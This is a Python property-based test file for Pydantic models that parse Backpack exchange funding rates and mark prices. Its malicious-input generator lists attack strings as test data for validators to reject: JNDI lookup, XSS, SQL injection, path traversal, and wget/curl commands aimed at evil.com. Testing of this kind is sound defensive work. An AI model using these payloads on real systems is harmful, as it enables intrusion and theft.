"""Property-based tests for Backpack raw funding rate models.

These tests validate critical security boundary models that process external funding rate data.
The models tested here are essential for perpetual swap trading, funding calculations, and pricing.

SECURITY CRITICAL: These raw models protect against:
- Malicious funding rate data that could manipulate trading decisions
- Financial precision errors in funding calculations
- Buffer overflow attacks through oversized funding values
- Injection attacks through malformed funding structures
- Timestamp manipulation that could affect funding calculations
- Mark price manipulation affecting position valuations

Property testing ensures comprehensive coverage of funding rate edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any, TypedDict, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_funding import (
    BackpackRawFundingIntervalRate,
    BackpackRawFundingRateResponse,
    BackpackRawMarkPrice,
)
from cyberdelta.apis.exceptions.parsing import TimestampYearRangeError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import DateTimeParsingError, EmptyStringError


# =============================================================================
# TYPE DEFINITIONS FOR FUNDING MODEL TESTING
# =============================================================================


class FundingRateData(TypedDict):
    """Type definition for funding rate response data."""

    symbol: str
    rate: str
    markPrice: str
    indexPrice: str
    time: int


class MarkPriceData(TypedDict):
    """Type definition for mark price data."""

    symbol: str
    markPrice: str
    fundingRate: str


class FundingIntervalData(TypedDict):
    """Type definition for funding interval data."""

    symbol: str
    fundingRate: str
    intervalEndTimestamp: str


MaliciousValue = str | int | bytes | list[str] | dict[str, str] | float | bool | None
MaliciousDataDict = dict[str, MaliciousValue]


# =============================================================================
# HYPOTHESIS STRATEGIES FOR FUNDING MODEL TESTING
# =============================================================================


def funding_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for funding rate and price fields.

    Returns:
        A Hypothesis strategy for decimal strings used in funding rates and mark prices.
    """
    return st.one_of([
        # Funding rates (typically small values)
        st.decimals(min_value=Decimal(-1), max_value=Decimal(1), places=12).map(str),
        st.decimals(min_value=Decimal("-0.1"), max_value=Decimal("0.1"), places=9).map(str),
        # Mark prices (larger values)
        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=6).map(str),
        # Common funding values
        st.just("0"),
        st.just("0.0"),
        st.just("0.0001"),  # Typical funding rate
        st.just("-0.0001"),  # Negative funding rate
        st.just("0.000123456789"),  # High precision funding
        st.just("-0.000123456789"),  # Negative high precision
        st.just("50000.0"),  # BTC mark price
        st.just("3000.50"),  # ETH mark price
        st.just("0.00000001"),  # Minimum precision
        st.just("99999999.99999999"),  # Large mark price
        # Scientific notation (valid for decimal parsing)
        st.just("1e-6"),
        st.just("1.5e-3"),
        st.just("2.5e-4"),
        st.just("-1.2e-5"),
    ])


def funding_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid trading symbols for funding data.

    Returns:
        A Hypothesis strategy for valid trading symbol strings.
    """
    return st.one_of([
        # Common perpetual symbols
        st.just("BTC_USDC"),
        st.just("ETH_USDC"),
        st.just("SOL_USDC"),
        st.just("BTC_USDC_PERP"),
        st.just("ETH_USDC_PERP"),
        st.just("SOL_USDC_PERP"),
        # Generated symbols
        st.text(
            min_size=3,
            max_size=20,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_"
            ),
        ).filter(lambda x: x and "_" in x and not x.startswith("_") and not x.endswith("_")),
        # Edge cases
        st.just("A_B"),  # Minimum length
        st.just("VERY_LONG_SYMBOL_NAME_USDC"),  # Longer symbol
    ])


def funding_timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp integers for funding data.

    Returns:
        A Hypothesis strategy for valid timestamp integers.
    """
    return st.one_of([
        # Unix timestamps (seconds)
        st.integers(min_value=1000000000, max_value=2000000000),
        # Common patterns
        st.just(1234567890),  # Test timestamp
        st.just(1700000000),  # Recent timestamp
        st.just(1678886400),  # Standard timestamp
        # Edge cases
        st.just(0),  # Minimum
        st.integers(min_value=0, max_value=2**31 - 1),  # 32-bit safe range
    ])


def funding_iso_timestamp_strategy() -> SearchStrategy[str]:
    """Generate valid ISO timestamp strings for funding interval data.

    Returns:
        A Hypothesis strategy for valid ISO timestamp strings.
    """
    return st.one_of([
        # Standard ISO formats
        st.just("2025-06-09T00:00:00"),
        st.just("2024-01-15T14:30:00"),
        st.just("2023-12-31T23:59:59"),
        st.just("2025-01-01T00:00:00Z"),
        st.just("2024-06-15T12:30:45.123"),
        st.just("2024-06-15T12:30:45.123Z"),
        # With timezone offsets
        st.just("2024-06-15T12:30:45+00:00"),
        st.just("2024-06-15T12:30:45-05:00"),
        st.just("2024-06-15T12:30:45+08:00"),
        # Edge cases
        st.just("1970-01-01T00:00:00"),
        st.just("2038-01-19T03:14:07"),
    ])


@st.composite
def valid_funding_rate_data(draw: st.DrawFn) -> FundingRateData:
    """Generate valid funding rate response data.

    Returns:
        A dictionary with valid funding rate response data fields.
    """
    return {
        "symbol": draw(funding_symbol_strategy()),
        "rate": draw(funding_decimal_strategy()),
        "markPrice": draw(funding_decimal_strategy()),
        "indexPrice": draw(funding_decimal_strategy()),
        "time": draw(funding_timestamp_strategy()),
    }


@st.composite
def valid_mark_price_data(draw: st.DrawFn) -> MarkPriceData:
    """Generate valid mark price data.

    Returns:
        A dictionary with valid mark price data fields.
    """
    return {
        "symbol": draw(funding_symbol_strategy()),
        "markPrice": draw(funding_decimal_strategy()),
        "fundingRate": draw(funding_decimal_strategy()),
    }


@st.composite
def valid_funding_interval_data(draw: st.DrawFn) -> FundingIntervalData:
    """Generate valid funding interval rate data.

    Returns:
        A dictionary with valid funding interval rate data fields.
    """
    return {
        "symbol": draw(funding_symbol_strategy()),
        "fundingRate": draw(funding_decimal_strategy()),
        "intervalEndTimestamp": draw(funding_iso_timestamp_strategy()),
    }


def malicious_funding_strategy() -> SearchStrategy[MaliciousValue]:
    """Generate malicious values for funding security testing.

    Returns:
        A Hypothesis strategy for malicious values to test security boundaries.
    """
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-funding}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('funding-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE funding_rates;--"),
        st.just("1' UNION SELECT * FROM prices--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("F" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.funding.find(); //"),
        # JSON injection
        st.just('{"$where": "this.rate > 1"}'),
        # Funding manipulation
        st.just("0.0001'; UPDATE funding SET rate=1;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW FUNDING RATE RESPONSE MODEL
# =============================================================================


class TestBackpackRawFundingRateResponseProperties:
    """Property-based tests for BackpackRawFundingRateResponse validation and security."""

    @given(funding_data=valid_funding_rate_data())
    def test_funding_rate_validation_success_properties(
        self, funding_data: FundingRateData
    ) -> None:
        """Property: Valid funding rate data should always create valid response objects."""
        # Skip invalid decimal values
        try:
            # Cast to dict for dynamic field access
            data_dict = cast(dict[str, Any], funding_data)
            for field in ["rate", "markPrice", "indexPrice"]:
                decimal_val = Decimal(data_dict[field])
                assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        # Skip invalid timestamps (out of range)
        timestamp = funding_data["time"]
        assume(0 <= timestamp <= 2**31 - 1)

        # Skip empty symbols
        symbol = funding_data["symbol"]
        assume(symbol.strip())
        assume(len(symbol.encode("utf-8")) <= 64)

        obj = BackpackRawFundingRateResponse.model_validate(funding_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawFundingRateResponse)

        # Property: All fields should be preserved with correct types
        assert obj.symbol == funding_data["symbol"]
        assert obj.funding_rate == funding_data["rate"]
        assert obj.mark_price == funding_data["markPrice"]
        assert obj.index_price == funding_data["indexPrice"]
        assert obj.time == funding_data["time"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["symbol", "rate", "markPrice", "indexPrice", "time"]),
        malicious_value=malicious_funding_strategy(),
    )
    def test_funding_rate_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousValue
    ) -> None:
        """Property: Funding rate model should reject malicious inputs safely."""
        base_data = {
            "symbol": "BTC_USDC",
            "rate": "0.0001",
            "markPrice": "50000.0",
            "indexPrice": "49999.0",
            "time": 1234567890,
        }
        base_data[field_name] = cast(Any, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            TimestampYearRangeError,
            DateTimeParsingError,
        )):
            BackpackRawFundingRateResponse.model_validate(base_data)

    @given(
        decimal_field=st.sampled_from(["rate", "markPrice", "indexPrice"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("1000.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            st.just("-0.0001"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_funding_rate_decimal_validation_properties(
        self, decimal_field: str, decimal_value: str
    ) -> None:
        """Property: Funding rate decimal fields should validate properly."""
        funding_data = {
            "symbol": "BTC_USDC",
            "rate": "0.0001",
            "markPrice": "50000.0",
            "indexPrice": "49999.0",
            "time": 1234567890,
        }
        funding_data[decimal_field] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = BackpackRawFundingRateResponse.model_validate(funding_data)
                field_value = getattr(
                    obj,
                    decimal_field.replace("markPrice", "mark_price")
                    .replace("indexPrice", "index_price")
                    .replace("rate", "funding_rate"),
                )
                assert field_value == decimal_value
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError)):
                    BackpackRawFundingRateResponse.model_validate(funding_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawFundingRateResponse.model_validate(funding_data)

    @given(funding_data=valid_funding_rate_data())
    def test_funding_rate_immutability_properties(self, funding_data: FundingRateData) -> None:
        """Property: Funding rate objects should be immutable after creation."""
        # Skip invalid data
        try:
            # Cast to dict for dynamic field access
            data_dict = cast(dict[str, Any], funding_data)
            for field in ["rate", "markPrice", "indexPrice"]:
                decimal_val = Decimal(data_dict[field])
                assume(decimal_val.is_finite())
            assume(0 <= data_dict["time"] <= 2**31 - 1)
            assume(data_dict["symbol"].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawFundingRateResponse.model_validate(funding_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.funding_rate = "0.9999"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.time = 9999999999

    @given(funding_data=valid_funding_rate_data())
    def test_funding_rate_financial_precision_properties(
        self, funding_data: FundingRateData
    ) -> None:
        """Property: Funding rate model should preserve financial precision exactly."""
        # Only test valid finite decimals
        try:
            rate_val = Decimal(funding_data["rate"])
            mark_val = Decimal(funding_data["markPrice"])
            index_val = Decimal(funding_data["indexPrice"])
            assume(all(val.is_finite() for val in [rate_val, mark_val, index_val]))
            assume(0 <= funding_data["time"] <= 2**31 - 1)
            assume(funding_data["symbol"].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawFundingRateResponse.model_validate(funding_data)

        # Property: Decimal values should be preserved exactly as strings
        assert obj.funding_rate == funding_data["rate"]
        assert obj.mark_price == funding_data["markPrice"]
        assert obj.index_price == funding_data["indexPrice"]


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW MARK PRICE MODEL
# =============================================================================


class TestBackpackRawMarkPriceProperties:
    """Property-based tests for BackpackRawMarkPrice validation and security."""

    @given(mark_data=valid_mark_price_data())
    def test_mark_price_validation_success_properties(self, mark_data: MarkPriceData) -> None:
        """Property: Valid mark price data should always create valid objects."""
        # Skip invalid decimal values
        try:
            # Cast to dict for dynamic field access
            data_dict = cast(dict[str, Any], mark_data)
            for field in ["markPrice", "fundingRate"]:
                decimal_val = Decimal(data_dict[field])
                assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        # Skip empty symbols
        symbol = mark_data["symbol"]
        assume(symbol.strip())
        assume(len(symbol.encode("utf-8")) <= 64)

        obj = BackpackRawMarkPrice.model_validate(mark_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawMarkPrice)

        # Property: All fields should be preserved with correct types
        assert obj.symbol == mark_data["symbol"]
        assert obj.mark_price == mark_data["markPrice"]
        assert obj.funding_rate == mark_data["fundingRate"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("validate_by_name") is True

    @given(
        field_name=st.sampled_from(["symbol", "markPrice", "fundingRate"]),
        malicious_value=malicious_funding_strategy(),
    )
    def test_mark_price_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousValue
    ) -> None:
        """Property: Mark price model should reject malicious inputs safely."""
        base_data = {
            "symbol": "BTC_USDC",
            "markPrice": "50000.0",
            "fundingRate": "0.0001",
        }
        base_data[field_name] = cast(Any, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawMarkPrice.model_validate(base_data)

    @given(mark_data=valid_mark_price_data())
    def test_mark_price_immutability_properties(self, mark_data: MarkPriceData) -> None:
        """Property: Mark price objects should be immutable after creation."""
        # Skip invalid data
        try:
            # Cast to dict for dynamic field access
            data_dict = cast(dict[str, Any], mark_data)
            for field in ["markPrice", "fundingRate"]:
                decimal_val = Decimal(data_dict[field])
                assume(decimal_val.is_finite())
            assume(mark_data["symbol"].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawMarkPrice.model_validate(mark_data)

        # Property: Fields should not be modifiable (note: BackpackRawMarkPrice is not frozen)
        # But still test that we can't assign invalid types
        original_symbol = obj.symbol
        original_mark_price = obj.mark_price
        original_funding_rate = obj.funding_rate

        # Verify values are preserved
        assert obj.symbol == original_symbol
        assert obj.mark_price == original_mark_price
        assert obj.funding_rate == original_funding_rate


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW FUNDING INTERVAL RATE MODEL
# =============================================================================


class TestBackpackRawFundingIntervalRateProperties:
    """Property-based tests for BackpackRawFundingIntervalRate validation and security."""

    @given(interval_data=valid_funding_interval_data())
    def test_funding_interval_validation_success_properties(
        self, interval_data: FundingIntervalData
    ) -> None:
        """Property: Valid funding interval data should always create valid objects."""
        # Skip invalid decimal values
        try:
            decimal_val = Decimal(interval_data["fundingRate"])
            assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        # Skip empty symbols and timestamps
        symbol = interval_data["symbol"]
        assume(symbol.strip())
        assume(len(symbol.encode("utf-8")) <= 64)

        timestamp = interval_data["intervalEndTimestamp"]
        assume(timestamp.strip())

        obj = BackpackRawFundingIntervalRate.model_validate(interval_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawFundingIntervalRate)

        # Property: All fields should be preserved with correct types
        assert obj.symbol == interval_data["symbol"]
        assert obj.rate == interval_data["fundingRate"]
        assert obj.time == interval_data["intervalEndTimestamp"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["symbol", "fundingRate", "intervalEndTimestamp"]),
        malicious_value=malicious_funding_strategy(),
    )
    def test_funding_interval_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousValue
    ) -> None:
        """Property: Funding interval model should reject malicious inputs safely."""
        base_data = {
            "symbol": "SOL_USDC_PERP",
            "fundingRate": "-0.000015513",
            "intervalEndTimestamp": "2025-06-09T00:00:00",
        }
        base_data[field_name] = cast(Any, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawFundingIntervalRate.model_validate(base_data)

    @given(interval_data=valid_funding_interval_data())
    def test_funding_interval_immutability_properties(
        self, interval_data: FundingIntervalData
    ) -> None:
        """Property: Funding interval objects should be immutable after creation."""
        # Skip invalid data
        try:
            decimal_val = Decimal(interval_data["fundingRate"])
            assume(decimal_val.is_finite())
            assume(interval_data["symbol"].strip())
            assume(interval_data["intervalEndTimestamp"].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawFundingIntervalRate.model_validate(interval_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.rate = "0.9999"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.symbol = "HACKED_SYMBOL"


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestBackpackRawFundingIntegrationProperties:
    """Integration property tests for funding models working together."""

    @given(
        funding_rate_data=valid_funding_rate_data(),
        mark_price_data=valid_mark_price_data(),
        interval_data=valid_funding_interval_data(),
    )
    def test_funding_models_integration_properties(
        self,
        funding_rate_data: FundingRateData,
        mark_price_data: MarkPriceData,
        interval_data: FundingIntervalData,
    ) -> None:
        """Property: All funding models should work consistently together."""
        # Use same symbol for all models
        common_symbol = "BTC_USDC_PERP"
        # Cast to dict for dynamic field assignment
        cast(dict[str, Any], funding_rate_data)["symbol"] = common_symbol
        cast(dict[str, Any], mark_price_data)["symbol"] = common_symbol
        cast(dict[str, Any], interval_data)["symbol"] = common_symbol

        # Skip invalid data
        try:
            # Validate all decimal fields
            # Cast to dict for dynamic field access
            funding_dict = cast(dict[str, Any], funding_rate_data)
            mark_dict = cast(dict[str, Any], mark_price_data)
            for field in ["rate", "markPrice", "indexPrice"]:
                decimal_val = Decimal(funding_dict[field])
                assume(decimal_val.is_finite())
            for field in ["markPrice", "fundingRate"]:
                decimal_val = Decimal(mark_dict[field])
                assume(decimal_val.is_finite())
            decimal_val = Decimal(interval_data["fundingRate"])
            assume(decimal_val.is_finite())

            # Validate other constraints
            assume(0 <= funding_rate_data["time"] <= 2**31 - 1)
            assume(interval_data["intervalEndTimestamp"].strip())
        except (ValueError, TypeError):
            assume(False)

        # Property: All models should be created successfully with consistent symbol
        funding_obj = BackpackRawFundingRateResponse.model_validate(funding_rate_data)
        mark_obj = BackpackRawMarkPrice.model_validate(mark_price_data)
        interval_obj = BackpackRawFundingIntervalRate.model_validate(interval_data)

        # Property: All should have the same symbol
        assert funding_obj.symbol == common_symbol
        assert mark_obj.symbol == common_symbol
        assert interval_obj.symbol == common_symbol

        # Property: All objects should be properly typed
        assert isinstance(funding_obj, BackpackRawFundingRateResponse)
        assert isinstance(mark_obj, BackpackRawMarkPrice)
        assert isinstance(interval_obj, BackpackRawFundingIntervalRate)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from([
                "symbol",
                "rate",
                "markPrice",
                "indexPrice",
                "time",
                "fundingRate",
                "intervalEndTimestamp",
            ]),
            malicious_funding_strategy(),
            min_size=3,
            max_size=7,
        )
    )
    def test_funding_models_adversarial_input_properties(
        self, complete_malicious_data: MaliciousDataDict
    ) -> None:
        """Property: All funding models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected by all models

        # Test BackpackRawFundingRateResponse
        if all(
            key in complete_malicious_data
            for key in ["symbol", "rate", "markPrice", "indexPrice", "time"]
        ):
            with pytest.raises((
                ValidationError,
                TypeError,
                EmptyStringError,
                TypeFieldError,
                TimestampYearRangeError,
                DateTimeParsingError,
            )):
                BackpackRawFundingRateResponse.model_validate({
                    "symbol": complete_malicious_data["symbol"],
                    "rate": complete_malicious_data["rate"],
                    "markPrice": complete_malicious_data["markPrice"],
                    "indexPrice": complete_malicious_data["indexPrice"],
                    "time": complete_malicious_data["time"],
                })

        # Test BackpackRawMarkPrice
        if all(key in complete_malicious_data for key in ["symbol", "markPrice", "fundingRate"]):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawMarkPrice.model_validate({
                    "symbol": complete_malicious_data["symbol"],
                    "markPrice": complete_malicious_data["markPrice"],
                    "fundingRate": complete_malicious_data["fundingRate"],
                })

        # Test BackpackRawFundingIntervalRate
        if all(
            key in complete_malicious_data
            for key in ["symbol", "fundingRate", "intervalEndTimestamp"]
        ):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawFundingIntervalRate.model_validate({
                    "symbol": complete_malicious_data["symbol"],
                    "fundingRate": complete_malicious_data["fundingRate"],
                    "intervalEndTimestamp": complete_malicious_data["intervalEndTimestamp"],
                })


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawFundingRateResponse_real_world_example() -> None:
    """Test with real-world funding rate data."""
    payload = {
        "symbol": "BTC_USDC",
        "rate": "0.0001",
        "markPrice": "50000.0",
        "indexPrice": "49999.0",
        "time": 1234567890,
    }
    obj = BackpackRawFundingRateResponse.model_validate(payload)
    assert obj.symbol == "BTC_USDC"
    assert obj.funding_rate == "0.0001"
    assert obj.mark_price == "50000.0"
    assert obj.index_price == "49999.0"
    assert obj.time == 1234567890


def test_BackpackRawMarkPrice_real_world_example() -> None:
    """Test with real-world mark price data."""
    payload = {
        "symbol": "ETH_USDC",
        "markPrice": "0.00000001",
        "fundingRate": "-0.99999999",
    }
    obj = BackpackRawMarkPrice.model_validate(payload)
    assert obj.symbol == "ETH_USDC"
    assert obj.mark_price == "0.00000001"
    assert obj.funding_rate == "-0.99999999"


def test_BackpackRawFundingIntervalRate_real_world_example() -> None:
    """Test with real-world funding interval data."""
    payload = {
        "symbol": "SOL_USDC_PERP",
        "fundingRate": "-0.000015513",
        "intervalEndTimestamp": "2025-06-09T00:00:00",
    }
    obj = BackpackRawFundingIntervalRate.model_validate(payload)
    assert obj.symbol == "SOL_USDC_PERP"
    assert obj.rate == "-0.000015513"
    assert obj.time == "2025-06-09T00:00:00"


def test_BackpackRawFundingRateResponse_edge_case_example() -> None:
    """Test with edge case funding rate data."""
    payload = {
        "symbol": "A_B",
        "rate": "0",
        "markPrice": "0.00000001",
        "indexPrice": "0.00000001",
        "time": 0,
    }
    obj = BackpackRawFundingRateResponse.model_validate(payload)
    assert obj.symbol == "A_B"
    assert obj.funding_rate == "0"
    assert obj.mark_price == "0.00000001"
    assert obj.index_price == "0.00000001"
    assert obj.time == 0


def test_BackpackRawMarkPrice_negative_funding_example() -> None:
    """Test with negative funding rate in mark price data."""
    payload = {
        "symbol": "BTC_USDC",
        "markPrice": "100000.12345678",
        "fundingRate": "-0.000123456789",
    }
    obj = BackpackRawMarkPrice.model_validate(payload)
    assert obj.symbol == "BTC_USDC"
    assert obj.mark_price == "100000.12345678"
    assert obj.funding_rate == "-0.000123456789"


def test_BackpackRawFundingIntervalRate_timezone_example() -> None:
    """Test with timezone-aware timestamp in funding interval data."""
    payload = {
        "symbol": "ETH_USDC_PERP",
        "fundingRate": "0.000075",
        "intervalEndTimestamp": "2024-06-15T12:30:45+08:00",
    }
    obj = BackpackRawFundingIntervalRate.model_validate(payload)
    assert obj.symbol == "ETH_USDC_PERP"
    assert obj.rate == "0.000075"
    assert obj.time == "2024-06-15T12:30:45+08:00"
